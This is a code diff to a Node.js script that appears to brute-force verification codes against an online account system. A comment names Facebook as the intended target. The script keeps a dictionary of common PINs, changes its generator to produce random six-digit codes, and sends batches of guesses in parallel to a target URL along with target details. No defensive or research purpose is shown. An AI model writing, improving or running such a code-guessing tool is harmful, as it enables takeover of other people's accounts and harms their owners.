@@ -2,28 +2,24 @@ const readlineSync = require('readline-sync');
 const axios = require('axios');
 const fs = require('fs'); // A module that allows you to work with files
 const crypto = require('crypto'); // A module that provides cryptographic functionality
-const faker = require('faker'); // A module that generates fake data
 
 // A dictionary of common codes
 const dictionary = ["1234", "0000", "1111", "4321", "5555", "9999", "12345678", "87654321"];
 
-// A function that generates a possible code based on some rules and randomness
+// A function that generates a 6-digit code using crypto
 function generateCode() {
-    // For demonstration purposes, assume the code is the first four digits of the phone number and the last four digits of the account ID
-    // In a real scenario, you would need to use some techniques to guess or obtain this information
-    // Use faker to generate random phone numbers and account IDs
-    const phoneNumber = faker.phone.phoneNumber('####');
-    const accountId = faker.finance.account(8);
-    // Use crypto to generate random bytes and convert them to hex
-    const randomBytes = crypto.randomBytes(4).toString('hex');
-    // Combine the phone number, account ID and random bytes to form a code
-    const code = phoneNumber + accountId + randomBytes;
-    return code;
+  // Use crypto.randomInt to generate a random number from 100000 to 999999
+  const number = crypto.randomInt(100000, 1000000);
+  // Convert the number to a string
+  const code = number.toString();
+  // Return the code
+  return code;
 }
 
 // A function that checks the validity of a batch of codes
 async function checkBatchValidity(codes) {
     // Create an array of requests with the codes and the targetInfo
+    // TODO: Check what data and format Facebook expects and how to send it
     const requests = codes.map(code => axios.post(targetUrl, { code, targetInfo }));
     // Send all the requests at once and wait for the responses
     const responses = await Promise.all(requests);
